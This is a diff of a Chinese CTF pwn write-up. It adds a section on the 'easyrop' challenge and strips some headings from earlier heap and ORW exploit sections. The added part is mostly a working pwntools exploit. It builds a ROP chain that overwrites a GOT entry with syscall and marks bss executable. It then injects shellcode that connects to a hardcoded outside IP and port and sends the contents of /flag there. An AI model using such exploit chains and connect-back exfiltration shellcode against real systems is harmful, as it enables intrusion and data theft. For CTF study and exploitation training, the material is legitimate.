@@ -230,11 +230,9 @@ void main()
     read(0,buf,0x100);
 }
 ```
-### 思路
 编译指令gcc -fno-stack-protector -no-pie -o sandbox sandbox.c
 使用方法 seccomp-tools dump ./xxx
 
-### EXP
 ```python
 from pwn import *
 r=process('./good')
@@ -418,11 +416,10 @@ void main()
 	}
 }
 ```
-### 思路
 edit任意大小修改
 2.27使用的是setcontext+53，是利用rdi赋值
 抓着free_hook写setcontext
-### EXP
+
 ```python
 from pwn import *
 r=process('./orwheap18')
@@ -669,9 +666,7 @@ void main()
 	}
 }
 ```
-### 思路
 和2.27类似，但setcontext+61采用rdx传参，所以要借助一个gadget，结构有所变化
-### EXP
 ```python
 from pwn import *
 r=process('overheap20')
@@ -796,7 +791,6 @@ r.interactive()
 ![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/26177342-98e5a9dcf84e1e1e.png)
 泄露libc，改权限，bss上写入shellcode，运行后拿目录，然后重复一次orw拿flag，基本上改完权限就跑板子了，和上一道的区别就是改了权限用shellcode吧
 
-### EXP
 ```python
 from pwn import *
 context.log_level = 'debug'
@@ -1035,5 +1029,138 @@ p.sendline(flat(payload).ljust(0x100,"a")+"flag\x00\x00\x00\x00")
 p.interactive()
 ```
 
+## easyrop(2.27/IO全关+监听式orw+自建gadget)
 
+pwnhub上的一道题，题目情况如图，未开pie，got表可写
+
+![image-20220517095419337](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220517095419337.png)
+
+![image-20220517095432184](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220517095432184.png)
+
+![image-20220517095510700](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220517095510700.png)
+
+一开始的思路是ret2dl，但是变态的一点是输入流也关了，栈迁移都不行，最后的思路还是栈溢出利用csu修改got表项为syscall，同时执行mprotect改bss段权限，再用magic在bss段里写入短小(8字节)的gadget，利用repmovs写入长的shellcode同时跳转执行。
+
+> magic: add dword ptr [rbp - 0x3d], ebx; nop xxxxx; ret 主要实现在某一地址写入内容，可结合csu(opcode为015dc3)
+>
+> 这里调用的三个短gadget
+>
+> mov rsi, rsp; ret 将我们写在栈上的值赋给rsi，结合pop_rdi，为下面rep赋值
+>
+> pop rbp; pop rbx; pop rcx; ret 更方便的控制rbp和rbx利用magic，同时赋值rcx
+>
+> rep movs qword ptr [rdi],qword ptr [rsi];ret 地址递增赋值，用于我们写入shellcode 赋值rcx次
+
+```python
+# _*_ coding:utf-8 _*_
+from pwn import *
+import socket
+import struct
+context.update(arch="amd64", log_level="debug")
+
+# p = process('./easyrop')
+p = remote("47.97.127.1","28760")
+elf = ELF("./easyrop")
+libc = elf.libc
+def dbg():
+    gdb.attach(p)
+
+#-----------------------------------------------------------------------------------------
+s       = lambda data               :p.send(str(data))
+sa      = lambda text,data          :p.sendafter(text, str(data))
+sl      = lambda data               :p.sendline(str(data))
+sla     = lambda text,data          :p.sendlineafter(text, str(data))
+r       = lambda num=4096           :p.recv(num)
+ru      = lambda text               :p.recvuntil(text)
+uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
+uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
+lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)
+#-----------------------------------------------------------------------------------------
+pop_rdi = 0x0000000000400903
+pop_rsi_r15 = 0x0000000000400901
+alarm_plt = elf.plt['alarm']
+alarm_got = elf.got['alarm']
+csu1 = 0x00000000004008FA
+csu2 = 0x00000000004008E0
+magic = 0x0000000000400618# add dword ptr [rbp - 0x3d], ebx; nop xxxxx; ret
+bss = 0x601000+0x500
+'''
+0x0000000000400903: pop rdi; ret; 
+0x0000000000400901: pop rsi; pop r15; ret; 
+'''
+# socket+connect
+"""
+/* socket(AF_INET, SOCK_STREAM, 0) */
+push 41
+pop rax
+push 6
+pop rdx
+push 2
+pop rdi
+push 1
+pop rsi
+syscall
+
+/* connect(s, addr, len(addr))  */
+xchg eax, edi
+mov al, 42
+mov rcx, 0x0100007f11270002 /*127.0.0.1:10001 --> 0x7f000001:0x2711*/
+push rcx
+push rsp
+pop rsi
+mov dl, 16
+syscall
+"""
+# send flag
+""" 
+xchg eax, edx
+/* open flag */
+mov rbx, 0x67616c662f
+push rbx
+push rsp
+pop rdi
+xor esi, esi
+mov al, 2
+syscall
+
+xchg eax, esi
+xchg edx, edi
+push 0x601300
+pop rdx
+push 0x30
+pop r10
+mov al, 40
+syscall
+"""
+remote_ip = "150.158.144.112"# 用于监听的公网服务器(用自己的IP！！！)
+remote_port = 1234# 要在服务器管理处开启该端口的tcp连接
+reverse_shell = b"\x6a\x29\x58\x6a\x06\x5a\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\x02\x00"+ \
+    struct.pack(">h", remote_port)+socket.inet_aton(remote_ip) + b"\x51\x54\x5e\xb2\x10\x0f\x05"
+
+send_flag = b"\x92\x48\xbb\x2f\x66\x6c\x61\x67\x00\x00\x00\x53\x54\x5f\x31\xf6\xb0\x02\x0f\x05\x96\x87\xfa\x68\x00\x13\x60\x00\x5a\x6a\x30\x41\x5a\x31\xc0\xb0\x28\x0f\x05"
+
+pop_rbp_rbx_rcx_ret = bss
+mov_rsi_rsp_ret     = bss + 0x8
+rep_movs            = bss + 0x10
+
+pay = 'a'*0x10+p64(pop_rdi)+p64(0)+p64(alarm_plt)
+pay += p64(csu1)+p64(5)+p64(alarm_got+0x3d)+p64(0)*4+p64(magic)
+pay += p64(csu1)+p64(0)+p64(1)+p64(alarm_got)+p64(0x601000)+p64(0x1000)+p64(0x7)
+pay += p64(csu2)+p64(0)+p64(0xc3595b5d)+p64(bss+0x3d)+p64(0)*4+p64(magic)# pop_rbp_rbx_rcx_ret
+pay += p64(bss)+p64(bss+8+0x3d)+p64(0xc3e68948)+p64(0)+p64(magic)# mov_rsi_rsp_ret
+pay += p64(bss)+p64(bss+0x10+0x3d)+p64(0xc3a548f3)+p64(15)+p64(magic)# rep_movs 
+
+# rep构造 rdi:0x20/rsi:0x10->rdi:0x28/rsi:0x30(顺着rsp往下取了)->rdi:0x30:rsi:reverse_shell
+pay += p64(pop_rdi)+p64(bss+0x20)+p64(bss+0x8)# mov rsi, rsp; ret
+pay += p64(bss+0x10)+p64(bss+0x30)+reverse_shell+send_flag# rep movs
+
+sleep(5)
+# gdb.attach(p,'b *0x4008FA\nc\n')
+s(pay)
+print("length:", hex(len(pay)))
+print("len of reverse:", hex(len(reverse_shell+send_flag)))
+p.interactive()
+```
+
+![image-20220517101711344](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220517101711344.png)
 
